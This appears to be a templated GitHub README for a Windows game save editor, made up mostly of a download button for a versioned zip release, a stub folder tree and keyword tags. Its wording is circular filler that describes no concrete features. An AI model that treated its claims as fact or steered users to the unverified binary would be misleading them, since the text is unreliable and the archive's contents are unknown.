...
<img src="preview.svg" alt="Save Editor" width="100%"/>

# Save Editor

**Save editor (offline cache) — Windows desktop utility with batch export workflow**
...
**Save Editor** is a Windows-focused desktop utility for **save editor (offline cache)**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
[![Download](button.svg)](https://github.com/TankSpiderKind/save-editor-offline-cache-tool/releases/download/v2.10.71/save-editor-offline-cache-tool-v2.10.71.zip)
...
```
save-editor-offline-cache-tool/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · save-editor-offline-cache</sub>
</div>
